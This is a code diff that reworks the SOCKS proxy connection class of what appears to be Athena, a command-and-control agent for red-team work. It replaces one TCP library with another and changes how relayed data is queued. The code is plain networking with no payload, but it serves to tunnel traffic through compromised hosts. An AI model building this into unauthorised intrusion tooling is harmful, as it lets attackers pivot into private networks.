@@ -1,101 +1,66 @@
 ﻿using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Response;
 using Athena.Utilities;
+using SuperSimpleTcp;
+using System.ComponentModel.DataAnnotations;
+using System.Diagnostics;
+using System.Runtime.CompilerServices;
+using System.Security.Cryptography;
 
 namespace Athena.Models.Athena.Socks
 {
     public class AthenaSocksConnection
     {
-        public delegate void ExitRequestedHandler(object sender, SocksEventArgs e);
-        public event EventHandler<SocksEventArgs> HandleSocksEvent;
+        //https://github.com/MythicAgents/Apollo/blob/v3.0.0/Payload_Type/apollo/apollo/agent_code/ApolloInterop/Classes/Tcp/AsyncTcpClient.cs
         public int server_id { get; set; }
         public bool exited { get; set; }
-        public bool isConnecting = false;
-        public GodSharp.Sockets.TcpClient client { get; set; }
-        public ManualResetEvent onSocksEvent = new ManualResetEvent(false);
+        public SimpleTcpClient client;
+        public AutoResetEvent onSocksEvent = new AutoResetEvent(false);
+        //private List<byte> outQueue = new List<byte>();
+        private byte[] outQueue = new byte[0];
 
         public AthenaSocksConnection(ConnectionOptions co) {
+            this.client = new SimpleTcpClient(co.host, co.port);
+            this.client.Settings.StreamBufferSize = 32000;
+            this.client.Events.Connected += OnConnected;
+            this.client.Events.DataReceived += OnDataReceived;
+            this.client.Events.Disconnected += OnDisconnected;
             this.server_id = co.server_id;
             this.exited = false;
-
-            this.client = new GodSharp.Sockets.TcpClient(co.ip.ToString(), co.port)
-            {
-                OnConnected = (c) =>
-                {
-                    this.isConnecting = false;
-                    SocksMessage smOut = new SocksMessage(
-                        server_id = this.server_id,
-                        new ConnectResponse
-                        {
-                            bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
-                            bndport = new byte[] { 0x00, 0x00 },
-                            addrtype = co.addressType,
-                            status = ConnectResponseStatus.Success,
-                        }.ToByte(),
-                        this.exited
-                        );
-                    HandleSocksEvent(this, new SocksEventArgs(smOut));
-                    this.onSocksEvent.Set();
-                },
-                OnReceived = (c) =>
-                {
-                    byte[] b = c.Buffers;
-
-                    SocksMessage smOut = new SocksMessage(
-                        this.server_id, 
-                        c.Buffers, 
-                        this.exited);
-
-                    HandleSocksEvent(this, new SocksEventArgs(smOut));
-                },
-                OnDisconnected = (c) =>
-                {
-
-                    if (c.NetConnection.Connected)
-                    {
-                        this.exited = true;
-                    }
-
-                    SocksMessage smOut = new SocksMessage(
-                        this.server_id, 
-                        new byte[] { }, 
-                        this.exited);
-
-                    HandleSocksEvent(this, new SocksEventArgs(smOut));
-                },
-                OnException = (c) =>
-                {
-                    this.isConnecting = false;
-                    SocksMessage smOut = new SocksMessage(
-                        this.server_id,
-                        new ConnectResponse
-                        {
-                            bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
-                            bndport = new byte[] { 0x00, 0x00 },
-                            addrtype = co.addressType,
-                            status = ConnectResponseStatus.GeneralFailure,
-
-                        }.ToByte(),
-                        this.exited
-                   );
-                    HandleSocksEvent(this, new SocksEventArgs(smOut));
-                    this.onSocksEvent.Set();
-                },
-                OnStarted = (c) =>
-                {
-                    this.isConnecting = true;
-                }
-            };
         }
 
-        public bool IsConnectedOrConnecting()
+        private void OnDisconnected(object? sender, ConnectionEventArgs e)
         {
-            if (this.isConnecting)
+            this.exited = true;
+            this.onSocksEvent.Set();
+        }
+
+        private void OnDataReceived(object? sender, SuperSimpleTcp.DataReceivedEventArgs e)
+        {
+            outQueue = outQueue.Concat(e.Data.Array).ToArray();
+        }
+
+        private void OnConnected(object? sender, ConnectionEventArgs e)
+        {
+            this.onSocksEvent.Set();
+        }
+
+        public SocksMessage GetMessage()
+        {
+            if(this.outQueue.Count() > 0 || this.exited)
             {
-                this.onSocksEvent.WaitOne(60000);
+                Debug.WriteLine($"[{DateTime.Now}] Returning a message with {this.outQueue.Length} bytes (exited: {this.exited})");
+                SocksMessage smOut = new SocksMessage(
+                                       this.server_id,
+                                       this.outQueue,
+                                       this.exited
+                );
+                smOut.PrepareMessage();
+                this.outQueue = new byte[0];
+                return smOut;
             }
 
-            return this.client.Connected;
+            return null;
         }
     }
 }
